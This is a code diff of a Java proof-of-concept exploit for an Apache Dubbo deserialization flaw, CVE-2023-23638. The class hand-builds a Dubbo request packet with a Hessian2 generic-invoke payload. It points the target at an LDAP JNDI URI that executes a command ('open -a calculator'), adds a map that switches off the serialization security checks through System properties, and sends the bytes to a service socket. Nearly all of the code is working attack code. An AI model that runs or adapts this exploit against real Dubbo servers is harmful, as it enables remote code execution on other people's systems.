@@ -2,20 +2,26 @@ package top.lz2y.vul;
 
 import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
 import org.apache.dubbo.common.io.Bytes;
+import org.apache.dubbo.common.serialize.ObjectOutput;
+import org.apache.dubbo.common.serialize.Serialization;
+import org.apache.dubbo.common.serialize.fastjson2.FastJson2ObjectOutput;
+import org.apache.dubbo.common.serialize.fastjson2.FastJson2Serialization;
+import org.apache.dubbo.common.serialize.fastjson2.Fastjson2CreatorManager;
 import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
+import org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization;
+import org.apache.dubbo.common.serialize.java.CompactedJavaSerialization;
+import org.apache.dubbo.common.serialize.java.JavaObjectOutput;
+import org.apache.dubbo.common.serialize.nativejava.NativeJavaObjectOutput;
+import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
 import org.apache.dubbo.common.utils.ConcurrentHashSet;
-import org.apache.dubbo.common.utils.PojoUtils;
-import org.apache.dubbo.common.utils.SerializeClassChecker;
-import top.lz2y.tools.FileUtil;
+import org.apache.dubbo.rpc.model.FrameworkModel;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.lang.reflect.Field;
 import java.net.Socket;
-import java.util.HashMap;
-import java.util.HashSet;
-import java.util.Random;
+import java.util.*;
 
 
 /**
@@ -27,24 +33,34 @@ import java.util.Random;
  *      Apache Dubbo 3.1.x to 3.1.5
  */
 public class CVE202323638 {
+
+    public static String EXPLOIT_VARIANT = "Hession";
+    protected static final byte FLAG_REQUEST = (byte) 0x80;
+    protected static final byte FLAG_RESPONSE = (byte) 0x00;
+    protected static final byte FLAG_TWOWAY = (byte) 0x40;
+
     public static void main(String[] args) throws Exception{
 
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+
+        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
+//        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
+
+        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
 
         // header.
         byte[] header = new byte[16];
         // set magic number.
         Bytes.short2bytes((short) 0xdabb, header);
         // set request and serialization flag.
-        header[2] = (byte) ((byte) 0x80 | 2);
-
+        header[2] = (byte) (FLAG_REQUEST | 2);
+//        header[3] = (byte) ((byte) 0x00 | 20);
         // set request id.
         Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
-        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
-        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
 
         // set body
-        out.writeUTF("2.7.21");
+        out.writeUTF("xxx");
+        out.writeUTF("3.1.10");
             //todo 此处填写Dubbo提供的服务名
         out.writeUTF("top.lz2y.service.DemoService");
         out.writeUTF("");
@@ -54,12 +70,17 @@ public class CVE202323638 {
         out.writeUTF("sayHello");
         out.writeObject(new String[] {"java.lang.String"});
 
+        // normal invoke
+//        out.writeObject(new Object[] {"hello"});
+//        HashMap<String, Object> map = new HashMap<>();
+//        map.put("generic", "raw.return");
+//        out.writeObject(map);
         // Step-1
 //        getBypassPayload(out);
 
         // Step-2
             // POC 1: raw.return
-        getRawReturnPayload(out, "ldap://127.0.0.1:8072/wNfSybNGMm/Plain/Exec/eyJjbWQiOiJjYWxjIn0=");
+        getRawReturnPayload(out, "ldap://127.0.0.1:1389/Basic/Command/open -a calculator");
             // POC 2: bean
 //        getBeanPayload(out, "ldap://127.0.0.1:8072/wNfSybNGMm/Plain/Exec/eyJjbWQiOiJjYWxjIn0=");
 
@@ -72,7 +93,7 @@ public class CVE202323638 {
         byte[] bytes = byteArrayOutputStream.toByteArray();
 
         //todo 此处填写Dubbo服务地址及端口
-        Socket socket = new Socket("169.254.46.101", 20880);
+        Socket socket = new Socket("127.0.0.1", 20880);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
@@ -91,6 +112,21 @@ public class CVE202323638 {
         HashMap<String, Object> map = new HashMap<>();
         map.put("generic", "raw.return");
         out.writeObject(map);
+    }
+
+    private static Map getProperties() throws IOException {
+        Properties properties = new Properties();
+        properties.setProperty("dubbo.security.serialize.generic.native-java-enable", "true");
+        properties.setProperty("serialization.security.check", "false");
+        HashMap map = new HashMap();
+        map.put("class", "java.lang.System");
+        map.put("properties", properties);
+
+        return map;
+    }
+
+    private static void getNativeJavaPayload(Hessian2ObjectOutput out) throws IOException {
+        // TODO
     }
 
     private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
